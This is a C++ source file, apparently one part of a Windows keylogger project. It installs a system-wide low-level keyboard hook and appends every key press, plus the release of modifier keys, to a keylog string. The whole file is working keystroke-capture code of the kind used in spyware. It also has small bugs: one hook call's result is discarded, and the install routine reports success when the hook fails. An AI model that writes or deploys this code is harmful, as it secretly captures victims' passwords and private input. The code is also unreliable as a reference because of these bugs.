#include <iostream>
#include <fstream>
#include <windows.h>

#include <vector>
#include <string>

#include "IO.h"
#include "KeyConstants.h"
#include "KeyboardManager.h"

/** 
 * Handles key presses and releases
 **/
LRESULT KeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
{
	if (nCode < 0)
		CallNextHookEx(KeyboardManager::GetInstance().GetHook(), nCode, wparam, lparam);
	KBDLLHOOKSTRUCT* kbs = (KBDLLHOOKSTRUCT*)lparam;

	if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
	{
		/**
		 * Add key to keylog variable, if
		 * it can't be found in the map, then
		 * append [UNKNOWN] instead
		 **/
		KeyboardManager::GetInstance().keylog += Keys::GetKey(kbs->vkCode);

		if (kbs->vkCode == VK_RETURN)
			KeyboardManager::GetInstance().keylog += '\n';
	}
	else if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP)
	{
		DWORD key = kbs->vkCode;
		if (key == VK_CONTROL
			|| key == VK_LCONTROL
			|| key == VK_RCONTROL
			|| key == VK_SHIFT
			|| key == VK_RSHIFT
			|| key == VK_LSHIFT
			|| key == VK_MENU
			|| key == VK_LMENU
			|| key == VK_RMENU
			|| key == VK_CAPITAL
			|| key == VK_NUMLOCK
			|| key == VK_LWIN
			|| key == VK_RWIN)
		{
			std::string KeyName = Keys::GetKey(kbs->vkCode);
			KeyName.insert(1, "/");
			KeyboardManager::GetInstance().keylog += KeyName;
		}
	}

	return CallNextHookEx(KeyboardManager::GetInstance().GetHook(), nCode, wparam, lparam);
}

bool KeyboardManager::InstallHooks()
{
	eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyboardProc, GetModuleHandle(NULL), 0);
	IO::WriteAppLog("Keyboard Hook Started");

	return eHook == NULL;
}

bool KeyboardManager::UninstallHooks()
{
	BOOL b = UnhookWindowsHookEx(eHook);
	IO::WriteAppLog("Keyboard Hook Stopped");
	eHook = NULL;
	return b;
}
